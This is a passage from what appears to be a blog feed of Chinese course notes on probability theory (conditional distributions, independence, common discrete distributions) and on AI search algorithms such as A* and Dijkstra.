mode=display">\begin{aligned}f_X(x)=\int_{-\infty}^{+\infty}f(x,y)dy=\dfrac{1}{\sqrt{2\pi}\sigma_1}e^{-\frac{(x-\mu_1)^2}{2\sigma_1^2}},\,x\in\mathbb{R}.\end{aligned}</script><p>因此 $X\sim N(\mu_1,\sigma_1^2)$. 同理 $Y\sim N(\mu_2,\sigma_2^2)$.</p></li><li><p><strong>注</strong>  联合分布可确定边际分布, 边际分布不可确定联合分布.</p></li></ul><h2 id="条件分布-以-n-2-为例"><a href="#条件分布-以-n-2-为例" class="headerlink" title="条件分布 (以 $n=2$ 为例)"></a>条件分布 (以 $n=2$ 为例)</h2><ul><li><p><strong>定义(离散型条件分布)</strong>  $P(X=a_i,Y=b_j)=p_{ij}\ge 0$, $\sum\limits_{i,j}p_{ij}\equiv 1$.</p><script type="math/tex; mode=display">P(X=a_i\mid Y=b_j)=\dfrac{P(X=a_i,Y=b_j)}{P(Y=b_j)}=\dfrac{p_{ij}}{\sum\limits_{k}p_{kj}}.</script></li><li><p><strong>注</strong>  $\sum\limits_{i}P(X=a_i\mid Y=b_j)\equiv 1$.</p></li><li><p><strong>定义(连续型条件分布)</strong>  $(X,Y)$ 的 <strong>PDF</strong> 为 $f(x,y)$.</p><script type="math/tex; mode=display">\begin{aligned}P(X\le x\mid y\le Y\le y+dy)&=\dfrac{P(X\le x, y\le Y\le y+dy)}{P(y\le Y\le y+dy)}\\&=\dfrac{\int_{-\infty}^{x}(\int_{y}^{y+dy}f(s,t)dt)ds}{\int_{y}^{y+dy}f_Y(t)dt}.\end{aligned}</script></li><li><p><strong>定义(条件密度函数)</strong></p><script type="math/tex; mode=display">  f_{X\mid Y}(x\mid y\le Y\le y+dy)=\dfrac{\int_{y}^{y+dy}f(x,t)dt}{\int_{y}^{y+dy}f_Y(t)dt}.</script><p>  令 $dy\rightarrow 0$, 定义条件密度函数:</p><script type="math/tex; mode=display">  f_{X\mid Y}(x\mid y)=\dfrac{f(x,y)}{f_Y(y)}.</script><p>   条件密度函数 $f_{X\mid Y}(x\mid y)$ 为 <strong>PDF</strong>.</p></li><li><p><strong>注</strong></p><ul><li>$F(a\mid y)=P(X\le a\mid Y=y)=\int_{-\infty}^{a}f_{X\mid Y}(x\mid y)dx$;</li><li><strong>(乘法法则)</strong>  $f(x,y)=f_{X\mid Y}(x\mid y)f_Y(y)$;</li><li><strong>(全概率公式)</strong>  $f_X(x)=\int_{-\infty}^{\infty}f(x,y)dy=\int_{-\infty}^{\infty}f_{X\mid Y}(x\mid y)f_Y(y)dy$;</li><li><strong>(Bayes 公式)</strong>  $f_{Y\mid X}(y\mid x)=\dfrac{f(x,y)}{f_X(x)}=\dfrac{f_{X\mid Y}(x\mid y)f_Y(y)}{\int_{-\infty}^{\infty}f_{X\mid Y}(x\mid y)f_Y(y)dy}$.</li></ul></li><li><p><strong>例</strong>  二元正态分布.</p></li><li><p><strong>解答</strong>  注意到</p><script type="math/tex; mode=display">\begin{aligned}f_{Y\mid X}(y\mid x)&=\dfrac{f(x,y)}{f_X(x)}\\&=\dfrac{1}{\sqrt{2\pi}\sigma_2}\cdot\dfrac{1}{\sqrt{1-\rho^2}}\cdot\exp\{-\dfrac{[y-(\mu_2+\rho\dfrac{\sigma_2}{\sigma_1}(x-\mu_1))]^2}{2(1-\rho^2)\sigma_2^2}\}.\end{aligned}</script><p>即当 $X=x$ 时, $Y\sim N(\mu_2+\rho\dfrac{\sigma_2}{\sigma_1}(x-\mu_1),(1-\rho^2)\sigma_2^2)$.</p></li></ul><h2 id="独立性"><a href="#独立性" class="headerlink" title="独立性"></a>独立性</h2><ul><li><p><strong>定义(独立性)</strong>  $(X,Y)$ 的 <strong>CDF</strong> 为 $F(x,y)$, 边际 <strong>CDF</strong> $F_X(x)$, $F_Y(y)$. 若</p><script type="math/tex; mode=display">F(x,y)=F_X(x)F_Y(y),\,\forall\,x,y\in\mathbb{R}.</script><p>则称 $X,Y$ 相互独立.</p></li><li><p><strong>注</strong>  $X$, $Y$ 独立 $\Leftrightarrow f(x,y)=f_X(x)f_Y(y),\,\forall\,x,y\in\mathbb{R}$, 其中 $f$ 为 <strong>PDF/PMF</strong>.</p></li><li><p><strong>定义</strong>  $X_1,\cdots,X_n$ 相互独立 $\Leftrightarrow F(x_1,\cdots,x_n)=F_1(x_1)\cdots F_n(x_n),\,\forall\,x_1,\cdots,x_n\in\mathbb{R}.$</p></li><li><p><strong>注</strong>  $X_1,\cdots,X_n$ 独立 $\Leftrightarrow f(x_1,\cdots,x_n)=f_1(x_1)\cdots f_n(x_n),\,\forall\,x_1,\cdots,x_n\in\mathbb{R}$, 其中 $f$ 为 <strong>PDF/PMF</strong>.</p></li><li><p><strong>定理</strong></p><ul><li>$f(x_1,\cdots,x_n)=g_1(x_1)\cdots g_n(x_n),\,\forall\,x_1,\cdots,x_n\in\mathbb{R}$, 则 $X_1,\cdots,X_n$ 独立.</li><li>$X_1,\cdots,X_n$ 独立, $Y_1=g_1(X_1,\cdots,X_n), Y_2=g_2(X_1,\cdots,X_n)$, 则 $Y_1$, $Y_2$ 独立.</li></ul></li></ul><h2 id="随机向量的函数"><a href="#随机向量的函数" class="headerlink" title="随机向量的函数"></a>随机向量的函数</h2><ul><li><p><strong>定义</strong>  $Y=g(X_1,\cdots,X_n)$ </p></li><li><p><strong>例</strong>  $X_i\sim B(n_i, p),i=1,2$ 独立, $Y=X_1+X_2$.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">\begin{aligned}P(Y=k)&=P(X_1+X_2=k)=\sum_{j=0}^{k}P(X=j,X_2=k-j)\\&=\sum_{j=0}^{k}P(X=j)P(X_2=k-j)\\&=\sum_{j=0}^{k}C_{n_1}^{j}C_{n_2}^{k-j}p^k(1-p)^{n_1+n_2-k}\\&=C_{n_1+n_2}^{k}p^k(1-p)^{n_1+n_2-k}.\end{aligned}</script><p>那么有 $Y\sim B(n_1+n_2,p).$</p></li><li><p><strong>例</strong>  $X_1,X_2$ 连续, $X_1&gt;0$, 其联合 <strong>PDF</strong> 为 $f(x_1,x_2)$, 且 $Y=\dfrac{X_2}{X_1}$.</p></li><li><p><strong>解答</strong>  注意到 $\forall\,y&gt;0$,</p><script type="math/tex; mode=display">\begin{aligned}P(Y\le y)&=P(\dfrac{X_2}{X_1}\le y)\\&=P(X_2\le yX_1)\\&=\int_{D}f(x_1,x_2)dx_1dx_2\\&=\int_{0}^{\infty}(\int_{-\infty}^{yx_1}f(x_1,x_2)dx_2)dx_1\\&=\int_{0}^{\infty}(\int_{-\infty}^{y}f(x_1,x_1t)x_1dt)dx_1.\end{aligned}</script><p>故 $Y$ 的 <strong>PDF</strong> 为</p><script type="math/tex; mode=display">l(y)=\int_{0}^{\infty}x_1f(x_1,x_1y)dx_1.</script></li><li><p><strong>定义(密度函数变换法)</strong>  $X_1,X_2$ 的联合 <strong>PDF</strong> 为 $f(x_1,x_2)$, $g_1,g_2$ 可微可逆, 满足</p><script type="math/tex; mode=display">  \begin{cases}  Y_1=g_1(X_1,X_2)\\  Y_2=g_2(X_1,X_2)  \end{cases}\Rightarrow  \begin{cases}  X_1=h_1(Y_1,Y_2)\\  X_2=h_2(Y_1,Y_2)  \end{cases}</script><p>  那么</p><script type="math/tex; mode=display">  \begin{aligned}  P((Y_1,Y_2)\in A)&=P((X_1,X_2)\in B)\\  &=\int_{B}f(x_1,x_2)dx_1dx_2\\  &=\int_{A}f(h_1(y_1,y_2),h_2(y_1,y_2))\vert J\vert dy_1dy_2.  \end{aligned}</script><p>  其中</p><script type="math/tex; mode=display">  J=det\begin{pmatrix}  \dfrac{\partial h_1}{\partial y_1},\dfrac{\partial h_1}{\partial y_2}\\  \dfrac{\partial h_2}{\partial y_1},\dfrac{\partial h_2}{\partial y_2}  \end{pmatrix}</script><p>  故 $Y_1,Y_2$ 的 <strong>PDF</strong> 为</p><script type="math/tex; mode=display">  l(y_1,y_2)=f(h_1(y_1,y_2),h_2(y_1,y_2))\vert J\vert.</script></li><li><p><strong>例</strong>  $X_1,X_2$ 连续, $X_1&gt;0$, 其联合 <strong>PDF</strong> 为 $f(x_1,x_2)$, 且 $Y=X_1+X_2$.</p></li><li><p><strong>解答</strong></p><p>令 $Z=X_1$, 则 $X_1=Z, X_2=Y-Z$. 故 $Y,Z$ 的 <strong>PDF</strong> 为</p><script type="math/tex; mode=display">l(y,z)=f(z,y-z)\vert J\vert=f(z,y-z).</script><p>其中</p><script type="math/tex; mode=display">J=det\begin{pmatrix}0,&1\\1,&-1\end{pmatrix}</script><p>那么 $Y$ 的 <strong>PDF</strong> 为</p><script type="math/tex; mode=display">l_Y(y)=\int_{-\infty}^{\infty}f(z,y-z)dz</script></li><li><p><strong>注</strong></p><ul><li><p>若 $X_1,X_2$ 独立, 则</p><script type="math/tex; mode=display">l_Y(y)=\int_{-\infty}^{\infty}f_1(z)f_2(y-z)dz=f_1*f_2(y).</script></li><li><p>若 $(X_1,X_2)\sim N(\mu_1,\mu_2,\sigma_1^2,\sigma_2^2,\rho)$, 则 </p><script type="math/tex; mode=display">Y=X_1+X_2\sim N(\mu_1+\mu_2,\sigma_1^2+\sigma_2^2+2\rho\sigma_1\sigma_2).</script></li></ul></li><li><p><strong>注</strong>  三大分布: <strong>Chi-Square</strong> 分布 $\chi^2(n)$, $t_n$, $F$.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability &amp; Statistics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能导论 笔记1</title>
      <link href="/2023/03/15/ren-gong-zhi-neng-dao-lun-bi-ji-1/"/>
      <url>/2023/03/15/ren-gong-zhi-neng-dao-lun-bi-ji-1/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章-搜索问题"><a href="#第一章-搜索问题" class="headerlink" title="第一章 搜索问题"></a>第一章 搜索问题</h1><h2 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h2><ul><li><p>优先扩展深度深的节点.</p></li><li><p><strong>例</strong>  皇后问题 (<strong>深度优先+回溯</strong>).</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301958232.png" alt=""></p></li><li><p>性质:</p><ul><li>一般<strong>不能保证</strong>找到最优解.</li><li>当深度限制不合理时, 可能找不到解, 可以将算法改为<strong>可变深度</strong>限制.</li><li>最坏情况时, 搜索空间等同于<strong>穷举</strong>.</li><li>是一个通用的<strong>与问题无关</strong>的方法.</li><li><strong>节省内存</strong>, 只存储从初始节点到当前节点的路径.</li></ul></li></ul><h2 id="宽度优先搜索"><a href="#宽度优先搜索" class="headerlink" title="宽度优先搜索"></a>宽度优先搜索</h2><ul><li><p>优先扩展深度浅的节点.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301958233.png" alt=""></p></li><li><p>性质:</p><ul><li>当问题有解时, <strong>一定</strong>能找到解.</li><li>当问题为<strong>单位耗散值</strong>, 且问题<strong>有解</strong>时, 一定能找到<strong>最优解</strong>.</li><li>方法与问题无关, 具有<strong>通用性</strong>.</li><li><strong>效率</strong>较低, <strong>存储量</strong>比较大 (带<strong>深度模拟</strong>的<strong>深度优先搜索</strong>).</li></ul></li></ul><h2 id="Dijkstra-算法"><a href="#Dijkstra-算法" class="headerlink" title="Dijkstra 算法"></a>Dijkstra 算法</h2><ul><li><p>宽度优先没有考虑两个节点间的距离.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301958234.png" alt=""></p></li><li><p>优先扩展距离起点最近的节点, 直到终点距离最短.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301958235.png" alt=""></p></li><li><p>优点: 当问题<strong>有解</strong>时, 可以找到<strong>最佳解</strong>.</p></li><li><p>不足: 只考虑了<strong>节点距离起点</strong>的距离, 没有考虑<strong>节点到终点</strong>的距离.</p></li></ul><h2 id="启发式图搜索"><a href="#启发式图搜索" class="headerlink" title="启发式图搜索"></a>启发式图搜索</h2><ul><li><p>引入<strong>启发知识</strong>, 保证找到<strong>最佳解</strong>时, 尽可能<strong>减少搜索范围</strong>, 提高<strong>搜索效率</strong>.</p></li><li><p>启发知识: <strong>评估节点到达目标的距离</strong>.</p></li><li><p><strong>启发式搜索算法 A</strong>:</p><ul><li><p>$g^*(n)$: 从 $s$ 到 $n$ 的最短路径的耗散值.</p></li><li><p>$h^*(n)$: 从 $n$ 到 $g$ 的最短路径的耗散值.</p></li><li><p>$f^*(n)=g^*(n)+h^*(n)$: 从 $s$ 经过 $n$ 到 $g$ 的最短路径的耗散值.</p></li><li><p>$g(n)$, $h(n)$, $f(n)$ 分别是 $g^*(n)$, $h^*(n)$, $f^*(n)$ 的<strong>估计值</strong>.</p></li><li><p>用 $f(n)$ 对待扩展节点<strong>进行评价</strong>, 优先扩展 $f(n)$ 值最小的节点, 直到 $f(终点)$ 最小.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301958236.png" alt=""></p></li><li><p>$m_j$: 扩展时<strong>第一次生成</strong>, 父节点标记为 $n$.</p></li><li><p>$m_k$: 已生成<strong>尚未扩展</strong>, 比较 $f(m_k)$, $f(n,m_k)$ 决定是否重标记父节点.</p></li><li><p>$m_l$: 已生成<strong>已扩展</strong>, 比较 $f(m_l)$, $f(n,m_l)$ 决定是否重标记父节点, 并重新扩展.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301958237.png" alt=""></p>  <pre class="line-numbers language-pseudocode" data-language="pseudocode"><code class="language-pseudocode"># A-algorithm(s): s 为初始节点OPEN=(s), CLOSED=(), f(s)=g(s)+h(s);while OPEN 不空 do:    begin        n=FIRST(OPEN);        if GOAL(n) THEN return n;        REMOVE(n, OPEN), ADD(n, CLOSED);        EXPAND(n)→{m_i},      计算 f(n, m_i)=g(n, m_i)+h(m_i);  ADD(m_j, OPEN), 标记 m_j 到 n 的指针;      if f(n, m_k)&lt;f(m_k) then             f(m_k)=f(n, m_k), 标记 m_k 到 n 的指针;      if f(n, m_l)&lt;f(m_l) then             f(m_l)=f(n, m_l), 标记 m_l 到 n 的指针,       ADD(m_l, OPEN);    OPEN 中的节点按 f 值从小到大排序;   end whilereturn FAIL;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>从目标开始, 顺序访问<strong>父节点</strong>, 直到初始节点, 得到<strong>解路径</strong>.</p></li><li><p><strong>例(八数码问题)</strong>  定义 $g(n)$ 为到当前节点的耗散值, $h(n)$ 为当前节点<strong>不在位</strong>的将牌数.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301958238.png" alt=""></p></li></ul></li><li><p><strong>最佳图搜索算法 A*</strong>:</p><ul><li><p>在 <strong>A</strong> 算法中, 如果满足条件:</p><script type="math/tex; mode=display">  h(n)\le h^*(n)</script><p>  则 <strong>A</strong> 算法称为 <strong>A*</strong> 算法.</p></li><li><p><strong>例(八数码问题)</strong>  定义 $h_1(n)$ 为当前节点<strong>不在位</strong>的将牌数, $h_2(n)$ 为当前节点将牌<strong>不在位的距离和</strong>, 注意到这两种定义均满足 <strong>A*</strong> 算法的条件.</p></li><li><p>选取 $h$ 的<strong>一般原则</strong>: 放宽限制条件, 在<strong>宽条件</strong>下给出<strong>估计函数</strong>.</p></li><li><p><strong>定理 1</strong>  若存在从初始节点 $s$ 到目标节点 $t$ 有路径, 则 <strong>A*</strong> 必能找到最佳解结束.</p></li><li><p><strong>定理 2</strong>  对同一问题定义两个 <strong>A*</strong> 算法 <strong>A</strong>$_1$ 和 <strong>A</strong>$_2$, 若 <strong>A</strong>$_2$ 比 <strong>A</strong>$_1$ 有较多的启发信息, 即对所有非目标节点有 $h_2(n)&gt;h_1(n)$, 则在具有一条从 $s$ 到 $t$ 的路径的隐含图上, 搜索结束时由 <strong>A</strong>$_2$ 所扩展的每一个节点, 也必定由 <strong>A</strong>$_1$ 所扩展, 即 <strong>A</strong>$_1$ 扩展的节点数 $\ge$ <strong>A</strong>$_2$ 扩展的节点数 (估计更准确).</p><ul><li>上述评价指标是 “<strong>扩展的节点数</strong>”, 同一个节点只计算一次.</li><li>为什么条件不能是 $h_2(n)\ge h_1(n)$? 什么情况下会出现问题? 能否给定理再增加条件, 使得定理在 $h_2(n)\ge h_1(n)$ 条件下也成立?</li><li><strong>提示</strong>: 考虑那些 $f(n)=f^*(t)$ 的节点, $t$ 为目标节点. 如果不考虑这样的节点, 等号可以加上.</li></ul></li><li><p>对 $h$ 的<strong>评价方法</strong>: 设共<strong>扩展</strong>了 $d$ <strong>层</strong>节点, 共<strong>搜索</strong>了 $N$ <strong>个</strong>节点, 计算得<strong>平均分叉数</strong> $b^*$.</p><script type="math/tex; mode=display">  N=\dfrac{1-b^{*(d+1)}}{1-b^*}.</script><p>  $b^*$ <strong>越小</strong>, 说明 $h$ <strong>效果越好</strong>. $b^*$ 是较<strong>稳定</strong>的常数, 基本<strong>不随问题规模变化</strong>.</p></li></ul></li><li><p><strong>A* 算法的改进</strong>:</p><ul><li><p>因 <strong>A</strong> 算法对 $m_l$ 类节点可能要<strong>重新放回</strong>到 <strong>OPEN</strong> 表中, 因此可能会导致多次<strong>重复扩展</strong>同一个节点, 导致<strong>搜索效率下降</strong>.</p></li><li><p>扩展未找到<strong>初始节点</strong>到<strong>当前节点</strong>的<strong>最短路径</strong>; 距离<strong>越近</strong>, 估计应<strong>越准</strong>.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301958239.png" alt=""></p></li><li><p><strong>对 $h$ 加以限制</strong>: 第一次扩展节点时, 就找到了从 $s$ 到该节点的最短路径.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301958240.png" alt=""></p><p>  此时称 $h$ 是单调的.</p><ul><li><p><strong>定理</strong>  若 $h(n)$ 是单调的, 则 <strong>A*</strong> 扩展了节点 $n$ 之后, 就已经找到了到达节点 $n$ 的最佳路径. 即当 <strong>A*</strong> 选 $n$ 扩展时, 有 $g(n)=g^*(n)$.</p></li><li><p><strong>定理</strong>  当 $h(n)$ 满足单调条件时, 一定满足 <strong>A*</strong> 条件.</p></li></ul></li><li><p><strong>对算法加以改进</strong>: 避免或减少节点的多次扩展.</p><ul><li><strong>定理</strong>  <strong>OPEN</strong> 表上任以具有 $f(n)&lt;f^*(s)$ 的节点定会被 <strong>A*</strong> 扩展.</li><li><strong>定理</strong>  <strong>A*</strong> 选作扩展的任一节点, 定有 $f(n)\le f^*(s)$.</li><li><p><strong>定理</strong>  当 $h(n)$ 恒等于 0 时, $h$ 为单调的.</p><pre class="line-numbers language-pseudocode" data-language="pseudocode"><code class="language-pseudocode"># Modified-A-algorithm(s): s 为初始节点OPEN=(s), CLOSED=(), f(s)=g(s)+h(s), f_m=0;while OPEN 不空 do：    begin        NEST={n_i|f(n_i)&lt;f_m,ni-&gt;OPEN}      if NEST≠( ) then n=NEST 中 g 最小的节点        else n=FIRST(OPEN), f_m=f(n);        if GOAL(n) THEN return n;        REMOVE(n, OPEN), ADD(n, CLOSED);        EXPAND(n →{mi},      计算 f(n, m_i)=g(n, m_i)+h(m_i);  ADD(m_j, OPEN), 标记 m_j 到 n 的指针;      if f(n, m_k)&lt;f(m_k) then             f(m_k)=f(n, m_k), 标记 m_k 到 n 的指针;      if f(n, m_l)&lt;f(m_l) then             f(m_l)=f(n, m_l), 标记 m_l 到 n 的指针,       ADD(m_l, OPEN);    OPEN 中的节点按 f 值从小到大排序;   end whilereturn FAIL;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301958241.png" alt=""></p></li></ul></li></ul></li></ul><h2 id="其他的搜索算法"><a href="#其他的搜索算法" class="headerlink" title="其他的搜索算法"></a>其他的搜索算法</h2><ul><li><p><strong>局部搜索</strong>算法: <strong>爬山法</strong>.</p></li><li><p><strong>随机搜索</strong>算法.</p></li><li><p><strong>动态规划</strong>算法 (当 $\forall\,n$, 有 $h(n)=0$, <strong>A*</strong> 算法即为动态规划): <strong>viterbi</strong> 算法.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301958242.png" alt=""></p><script type="math/tex; mode=display">  Q(W_{i,j})=\begin{cases}  \min\limits_k(Q(W_{i-1,k})+D(W_{i-1,k},W_{i,j})),&i\ne 0\\  0,&i=0.  \end{cases}</script></li></ul><h2 id="搜索算法实用举例"><a href="#搜索算法实用举例" class="headerlink" title="搜索算法实用举例"></a>搜索算法实用举例</h2><ul><li><p><strong>拼音输入法</strong>:</p><script type="math/tex; mode=display">  P(S)=\prod_{i=1}^{n}P(w_i\mid w_1\cdots w_{i-1}).</script><p>  二元语法时:</p><script type="math/tex; mode=display">  P(S)=\prod_{i=1}^{n}P(w_i\mid w_{i-1}).</script><p>  需要求</p><script type="math/tex; mode=display">  \min\Big(-\sum_{i=1}^{n}\log\big(P(w_i\mid w_{i-1})\big)\Big)</script><p>  对应的句子.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959786.png" alt=""></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> IAI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Introduction to AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记2</title>
      <link href="/2023/03/08/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-2/"/>
      <url>/2023/03/08/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-2/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-2-随机变量"><a href="#Chap-2-随机变量" class="headerlink" title="Chap 2 随机变量"></a>Chap 2 随机变量</h1><h2 id="1-维随机变量"><a href="#1-维随机变量" class="headerlink" title="1 维随机变量"></a>1 维随机变量</h2><ul><li><p><strong>定义(随机变量)</strong>  样本空间上的实值函数.</p><script type="math/tex; mode=display">X: \Omega\rightarrow\mathbb{R},\,\omega\rightarrow X(\omega).</script></li><li><p><strong>例</strong></p></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">试验</th><th style="text-align:center">样本空间</th><th style="text-align:center">随机变量</th><th style="text-align:center">像集 (新样本空间)</th></tr></thead><tbody><tr><td style="text-align:center">随机调查 $50$ 人对某议题支持与否</td><td style="text-align:center">$\{(1, 0, \cdots), \cdots\}$</td><td style="text-align:center">$X_1= 1$ 的个数</td><td style="text-align:center">$\{0, 1, 2, \cdots, 50\}$</td></tr><tr><td style="text-align:center">随机抽取一个北京市成年公民</td><td style="text-align:center">所有北京市成年公民之集</td><td style="text-align:center">$X_2=$ 其 $2022$ 年的收入</td><td style="text-align:center">$(-\infty, +\infty)$</td></tr></tbody></table></div><ul><li><p><strong>定义(事件)</strong>  $X_1 = 30$, $X_2&gt;100,000$.</p></li><li><p><strong>注</strong></p><ul><li>概括作用: 提供了试验结果的数值摘要;</li><li>事件 <strong>v.s.</strong> 变量, 静态 <strong>v.s.</strong> 动态.</li></ul></li><li><p><strong>分类</strong></p><ul><li>离散型: 至多可数个取值;</li><li>连续型: 区间型取值 (定义不严格);</li><li>其他.</li></ul></li><li><p><strong>定义</strong>  $\forall I\subset\mathbb{R}$, 令 $X^{-1}(I)$ 表示 $I$ 在 $X$ 下的原像集, $X^{-1}(I)\subset\Omega$, 例如</p><script type="math/tex; mode=display">X^{-1}((a, b)) = \{\omega\in\Omega\mid a<X(\omega)<b\}.</script></li><li><p><strong>定义</strong> </p><script type="math/tex; mode=display">  P_{X}(X\in I) = P(X^{-1}(I)), \,\forall I\subset\mathbb{R}\,可测.</script><p>  需要 $X^{-1}(I)\in\mathscr{F}$, 一般记 $P_X$ 为 $P$.</p></li><li><p><strong>定义(累积分布函数)(CDF)</strong> </p><script type="math/tex; mode=display">  F(x) := P(X\le x), \,\forall x\in\mathbb{R}.</script><p>  我们有</p><script type="math/tex; mode=display">  P(a<X\le b)=F(b)-F(a).</script></li><li><p><strong>性质</strong></p><ul><li>$0\le F(x)\le 1$, 单调增(未必严格);</li><li>$\lim\limits_{x\rightarrow+\infty}F(x) = 1$, $\lim\limits_{x\rightarrow-\infty}F(x) = 0$;</li><li>右连续 ($PS.$ 若定义 $F(x) := P(X&lt;x)$, $\forall x\in\mathbb{R}$, 则有 $F(x)$ 左连续).</li></ul></li><li><p><strong>注</strong></p><ul><li><p>随机要素体现在样本点 $\omega$ 的不确定性;</p></li><li><p>随机变量的直观意义往往出现在样本空间的直观意义之前;</p></li></ul></li></ul><ul><li><p><strong>辨析</strong> </p><script type="math/tex; mode=display">  X_i=  \begin{cases}  1,\,第i次抛硬币正面向上; \\  0,\,第i次抛硬币正面向下. \\  \end{cases}</script><p>  其中 $i=1, 2$. 那么 $X_1 + X_2$ 的样本空间为</p><script type="math/tex; mode=display">  \{正正, 正反, 反正, 反反\}.</script><p>  因为随机变量可视作函数, 需要满足定义域相同, 因此 $X_1$, $X_2$ 的定义域同上.</p></li><li><p><strong>注</strong></p><ul><li>$aX+bY$, $XY$, $\dfrac{X}{Y}(Y\ne 0)$, $g(X,Y)$ 为随机变量, 其中 $X$, $Y$ 样本空间相同;</li><li>需要有 $X^{-1}(I)\in\mathscr{F}$, 从而 $P(X^{-1}(I))$ 有意义.</li></ul></li><li><p><strong>定义(同分布)</strong>  $X_1, X_2$ 的 <strong>CDF</strong> 分别为 $F_1(x), F_2(x)$, 那么</p><script type="math/tex; mode=display">  X_1, X_2 同分布\Leftrightarrow P(X_1^{-1}(I)) = P(X_2^{-1}(I)),\forall\,I\subset\mathbb{R}\,可测\\  \Leftrightarrow F_1(x) = F_2(x),\,\forall\,x\in\mathbb{R}.</script></li><li><p><strong>注</strong></p><ul><li>$X_1, X_2$ 同分布 $\nRightarrow X_1 = X_2$.</li><li>考虑掷一次硬币,  $X_1=$ 正面向上的次数, $X_2=$ 反面向上的次数, 这两个随机变量是同分布的.</li><li>随机变量是函数!</li></ul></li></ul><h2 id="离散型随机变量"><a href="#离散型随机变量" class="headerlink" title="离散型随机变量"></a>离散型随机变量</h2><ul><li><p><strong>定义(概率质量函数)(PMF)</strong> </p><script type="math/tex; mode=display">f(x) = P(X = x),\,\forall\,x\in\,\mathbb{R}.</script></li><li><p><strong>注</strong></p><ul><li>$f(x_i)=p_i, \sum\limits_{i}P_i = 1$;</li><li><strong>CDF</strong> 为阶梯函数.</li></ul></li><li><p><strong>定义(期望与方差)</strong> </p><script type="math/tex; mode=display">  E(X) = \sum\limits_{i}x_ip_i = \sum\limits_{i}x_if(x_i) = \mu\\  Var(X) = \sum\limits_{i}(x_i-\mu)^2p_i = \sum\limits_{i}(x_i-\mu)^2f(x_i) = \sigma^2</script><p>  我们有</p><script type="math/tex; mode=display">  Var(X) = E((X-E(X))^2) = E(X^2) - E^2(X).</script></li><li><p><strong>注</strong></p><ul><li>算数均值即期望:</li></ul><script type="math/tex; mode=display">\dfrac{1}{n}\sum_{i = 1}^na_i=\dfrac{1}{n}\sum_{i = 1}^nk_ix_i=\sum_{i = 1}^np_ix_i=\mu;</script><ul><li>期望存在 $\Leftrightarrow$ $\sum\limits_{i}\vert x_i\vert p_i&lt;+\infty$;</li><li>$E(g(X)) = \sum\limits_{i}g(x_i)p_i$;</li><li>$E(X), Var(X)$ 为随机变量 $X$ 的分布的特征, 分别刻画了随机变量的集中趋势和分散程度.</li></ul></li></ul><h2 id="常见离散分布"><a href="#常见离散分布" class="headerlink" title="常见离散分布"></a>常见离散分布</h2><ul><li><p><strong>定义(Bernoulli 分布)</strong></p><script type="math/tex; mode=display">X=\begin{cases}1,\,事件成功,\,p \\0,\,事件不成功,\,1-p \\\end{cases}</script><p>记为 $X\sim B(p)$. 我们有</p><script type="math/tex; mode=display">E(X)=p, Var(X)=p(1-p).</script></li><li><p><strong>定义(二项分布)</strong></p><p>  记 $X$ 为 $n$ 次独立 <strong>Bernoulli</strong> 试验的成功次数. 满足</p><script type="math/tex; mode=display">  P(X=k)=C_n^kp^k(1-p)^{n-k},\,k=0,1,\cdots,n.</script><p>  记为 $X\sim B(n,p)$. 我们有</p><script type="math/tex; mode=display">  E(X)=np, Var(X)=np(1-p).</script></li><li><p><strong>定义(Poisson 分布)</strong></p><p>  满足</p><script type="math/tex; mode=display">  P(X=k)=\dfrac{\lambda^k}{k!}e^{-\lambda},\,k=0,1,2,\cdots.</script><p>  记为 $X\sim P(\lambda)$. 我们有</p><script type="math/tex; mode=display">  E(X)=\lambda, Var(X)=\lambda.</script></li><li><p><strong>例</strong>  观察时间 $[0,1)$ 某路口发生的交通事故数 $X$.</p><ul><li><p>$l_i=[\dfrac{i-1}{n},\dfrac{i}{n}), i=1,2,\cdots,n$.</p></li><li><p>$n$ 充分大.</p></li><li><p>假设:</p><ul><li>$l_i$ 上至多发生一起事故;</li><li>$l_i$ 上恰发生一次事故的概率 $p=\dfrac{\lambda}{n}$, 与时长成正比;</li><li>$l_i$ 各段相互独立.</li></ul></li><li><p>此时</p><script type="math/tex; mode=display">  \begin{aligned}  P(X=k)&=C_n^kp^k(1-p)^{n-k}\\  &=\dfrac{n!}{k!(n-k)!}(\dfrac{\lambda}{n})^k(1-\dfrac{\lambda}{n})^{n-k}\\  